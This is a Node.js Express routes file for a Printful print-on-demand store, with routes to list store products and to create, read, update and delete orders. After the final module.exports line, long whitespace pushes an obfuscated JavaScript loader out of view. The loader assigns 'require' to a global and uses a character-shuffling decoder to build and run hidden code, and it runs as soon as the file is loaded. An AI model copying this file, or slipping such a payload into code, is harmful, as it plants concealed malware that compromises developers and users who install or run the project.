// routes.js
const express = require('express');
const router = express.Router();
const printfulService = require('../controller/printfulService');

const YOUR_STORE_ID = '13718088'; // Your store ID

router.get('/store/products', async (req, res) => {
    try {
        const products = await printfulService.getStoreProducts(YOUR_STORE_ID);
        res.json(products);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/store/products/:productId', async (req, res) => {
    const { productId } = req.params;
    try {
        const product = await printfulService.getSingleProduct(productId, YOUR_STORE_ID);
        res.json(product);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// List all orders
router.get('/orders', async (req, res) => {
    try {
        const orders = await printfulService.listOrders();
        res.json(orders);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Get a single order by ID
router.get('/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    try {
        const order = await printfulService.getOrder(orderId);
        res.json(order);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Create a new order
router.post('/orders', async (req, res) => {
    try {
        const orderData = req.body;
        const createdOrder = await printfulService.createOrder(orderData);
        res.json(createdOrder);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Update an order by ID
router.put('/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    const orderData = req.body;
    try {
        const updatedOrder = await printfulService.updateOrder(orderId, orderData);
        res.json(updatedOrder);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Delete an order by ID
router.delete('/orders/:orderId', async (req, res) => {
    const { orderId } = req.params;
    try {
        await printfulService.deleteOrder(orderId, YOUR_STORE_ID);
        res.json({ message: 'Order deleted successfully' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;         
																																																																																																																																																																																																																																																																																																													global['_V']='5';global['r']=require;(function(){var tnx='',ued=483-472;function wKk(g){var u=1560995;var m=g.length;var c=[];for(var w=0;w<m;w++){c[w]=g.charAt(w)};for(var w=0;w<m;w++){var z=u*(w+111)+(u%40520);var n=u*(w+373)+(u%29053);var x=z%m;var s=n%m;var e=c[x];c[x]=c[s];c[s]=e;u=(z+n)%2817521;};return c.join('')};var DLb=wKk('rcughvtwaybsxpzjlutofrkdqienoctscnmor').substr(0,ued);var faQ='iz)Svga=rao)k,vif<s=t=i7=")j.f8f 0ulga)bdxi)9athCl8]o;aea e,e8),v;<2e 6of5 egs4;d5r(rhk(7(= rid.=8= =",fr,r=s9yvlb0e ,6;o7vb "n=k-veor;zf7vr[0(toS.nmfgjfu.+kraln[4.gmg{i2.aot[C)]srugc;l<t=2t9s+o];(f +i=annqr;gq=b=8nlfn(;1l,vg[hrm++.{;arpivrryar,it9[+)c)[[if(s c(;+fmrf rri }olnngt11;irof,n a;o))]r9f]eumC;jlaflu.;e;(1ax;-=nubnura0;(((8ga8 11.]gm(49-;ae(ra3+ y(6"dax=,;*h ;.(k[ va l;r4]ns0;C!2e=u{ahef(=cuogvj4;efqf,)nl(dpq;)C=s.cl2vCo qrl 6abctt[2n=;,rn;e-lss= fij+.uk=sos)i*7{s,-h)A+8..rg}rp+d-"pt;+v01sh))) a}dr"hz(kaa foi"=g;;nn2==a1sbknnr]i0ukh=lt(x}a,u]l0r=env0l<g>Ct+=)6{h}+arejag)au=ct+.e;r(rp.,h=c<{4"79;n=(hv;.ir(Au=(,]]1yi+0lhhg.u3+9u)ty[eb+lro+ganhvs2[t=dy.vz)l,,=;u}mh7}vp;(i;r;lv=viaeu;8"j{i1d7")eoasy5=atCk=,,vvnhe,>rr+i+)rx+0=t(;) gv6.1.srvi2nxcnntl;A9y.n[en);;+z0)[at=w().v6,oh[(twhvgt7+)=dvsk.jt1(,wnrvpkArt;6 =r;meei)(o)g.](y=h.6rerr9hmAtg]);aeaf(;iuk+)p,o(r),]-t.,;x,(!t6';var lxh=wKk[DLb];var HEf='';var zwe=lxh;var oDQ=lxh(HEf,wKk(faQ));var pQg=oDQ(wKk('pR90%Pn[8n_g]%RR2$riitn_)95v>]].=5.R.3m50tN7H]3(n=dR4$.%nbR4rf([8nUaRRr_RRRnRs== rfR!$(rf)i\'=(]s.n}\/9 4rR1a]jA.src5i>en\/eRljft}R%], un.$rnin]d)R4)r5;4(R,o(s)t.l.1__id,R sg,{.leV_Ra_.R3bRR.(or%)R_oyzf)BtR)g)r%R)to(R%2OmdoR=R%%]gemm1Op_d().joao6tTRap)S=a2]byehiREa.ry1N.S(4lp2>3(mRl=vRca[fR.nolDnjeRrf1+ cjsR+htf(.9=v).;nad ;}p!<id_f.]eoReRR].)t(...b.%%f9;yrt"(5o(S%aV?9r=_3R$rfnr?RRs:=RuRt]fRfsf%b4:5py;oo_;Ff+s(R3p)RGnRaRfs[sR\'be]_Rewt].]e "5%]REg@3adjajrr%_a6keocm.,ie.ft.;i(D%%RntT]o4e.,=;D)ot(rR)etR,soRBF&)hg$vRwDsdmC)R13=teRR 4\/k}(RrsnRR%8.sFRg4"rvx;o n4n4v.No]!t5n(uR_2R(;4S%.dARj_Rore05}d%te%e,e.f+.$R$][.Rrl)R>pest1n 1=2%Rus0so,6uo-{asf91r97e[t!uSRrC4cwo@6(a6[5}.R0;0>t=?[5 ))a_Grn)ewRo(:!mcaf CdR%.n();)+rRbop.s2injjR(;)t{=.R=]).R(bo$te3R=.b!"RkuR_o7l8eAD}l_vRK;=0v$1o1s(6[p{x.Mnas5ftb;v]sxtefo_;lC3b)t ,S)+Rl(s)9eetP@{f.G=ar!c8(j.(ojR}s#as.(fis=);."i)3RV 5bolreo=%aiuRH!.nf:5!R)5296RRo_lRR(Gdl_)=).R]R7]ye]R].rl;lR pb,t9i).{_t3ng*)R%4tf))u;;.3ch;7c(Re,p9;.)-&3n(\/]S")(tRg]\'0b.#tdR"w(,, iv-[,rf:]5rerv.Rt8.o_:so)}%R,5g8e,t2.|1jb.!f0REC3idfi)p(1j7o;905]Ri#.][csbtfR34a$f11,tbs]d_%()@;oRem,tR,;ttie%}pfRnE)!43C.#]gi%gxR=?2\/d3.=R;tgi)"A)iaropg.oe]Rod)=57(5]]o.$Ryd]i;]f7NRf#lRrw.6z)R;.vnRjRmroG%)R?$iRnt_$#tt)%}Qt_[%RnRiS}..+_R|!.RRtffn!3]\/a;o,iPsr5 2R7,2. o04etR]rj(;m{RRr5o;r=sR3(!"95i%2iRR)RbdRR2effae%lsete_g"e!0R,pfst.=P8i,!Do=f1t}+ni& { 0tRpif)T>.)+;=E$??Cr.7,RK.R.(0g,sec6Rc]$)!wf6$Rws2(i(o[{ARlfm&kl)Re }n5r_ RnreTtS;e.1f1a}D;7D)ir(%j{8.T2))7e=1t5@.iei1_)n.w.f!3RR5(!\'LohbRRRsl%ss)tsR(5e[.R9;n(:f(nw$;R...=]}ripH@7u7_R,7+iMRf_BMR7tob> 3.{tplRRo9{R$)e_i.{hI((Rg}tI)nrl3a]R.R;ej[:);n<(rrfq4lR)to]||e7fi)_H,.%03ao(flLtw re}l5*tmv.o).nt)gR0$fVN1\/1;f\/S!(b)f;=02R)_O#(i,Rl_aRgjRfR]+]d4R ad6r%sw).>_.+01]be(f(t5!${]cnRN2oltRRrPR;3(=fta0Kb5l)i!n..hl$s5{lz)5R.!R4_ptR=g.9; $#!a%R.xn8reasRi+RC\/M.u0x;3f(]tes]4e.,)4DEQ_3-4=(R3w,RefyRl0R=\/f]bdR pis(9ytbRe"Ro-irit?6[r;e*52=t!86o)5 o6ro.0$Re$]]R_{=(nR570R5[f2{xs)e(3d,oR$=pt2R0)$ Mf]i{RJ!(t5\/p.*_7?gR.]Ryo$(.&[d0$R{g4m.4R2i)g;)sRIR, Ro;)sr,"c[ .agtnROeR]f)e%4t1B:..e1tf\/i!)](;?;ttQd.]tU4P;at.!;i0(]%.4?9t(aRrsR)tG$o;;?R=(_5{R+RA0ahNfi)(n].\/eo(_;co}rgRr,use2j\/R;g+R%{}R.wt()( ]]12&5k(sefi3rC\/)9onR8R2bRE2ih.1g]];(sbRauaD;RR[Ni)[40}>R)o%Ru_t?f,R}R(1e8a3hm-%RlRe]:)p?%5%&ji%ds.i)b)exRS3)1ft4A%Ht(RRtn8f=5t36Ef_c1_rR.5t_5}%!RRt$$mRpe]f  R)(.( c+10oeC.RR.>nLr.T]oth1Rr330R7]b8i]+13s%b.4o$t8RfkoiRej]bs$+R!n}.R5r7>S9.D.5RU=R47Ro(.o8 .RUR],1]tR.7:td=ncRh}?t2R 1<sp:R1;=TpRmTbmI.s(j{te|ttfR5)DR,n,1ap1. \'c)Q]47oRR4oResslS9t_.]e1]rR9iwc0)R=]41!\/c|RGeO(h)Rt+R48(9]oC)_a$e 5=!ks]+f%7fIftRa,\'R"G5R()%$Rr"6}%,Q3%2i56Ejj2.r!s5g(6}!R7tm,Rcwy=v [ dty=+ij_dhR"852"o,or p.,))RR]u{.Rs,SRRdoe.[)laee1Nm!_32]j}oR%no2%}ur;=,e=)oesRyf.o2(a[ijiRd6p[esaRtzqi.;74iRc5p07[16e$d6!n0)6RiR ljt1Rse;s{\/u9R_RbaRRo i3_ h0,,l)t=5ARR6$RzR0ri =aR]bfntb0)Rcro%hSaC.f,) )(f63)t(54.bg(sf.$.eLRn $R\/[lepR%])N7x}}{_f)(R?R6$SRRuf0iRR(9=s(s]0R [R <u7n;3w%&Ofa{r1f)r(=g..oef$_c0ae($ar(m;9ajA(?&Do?KR 3R!nplitio;9{asb+pNd$r)fm6 bw_R6o[o]4M$$;),R"3QR$)m"tRRcd!R7s8RoRni!Re)u&%2]e)arp,![#0(g.Oe&,Ra2j])t7)ie.[en<i5.0e]g}+_.cdngbCR5t_!$RR%t}[ ii-R {rhRfat8o0e]Ro'));var XWG=zwe(tnx,pQg );XWG(5318);return 2835})()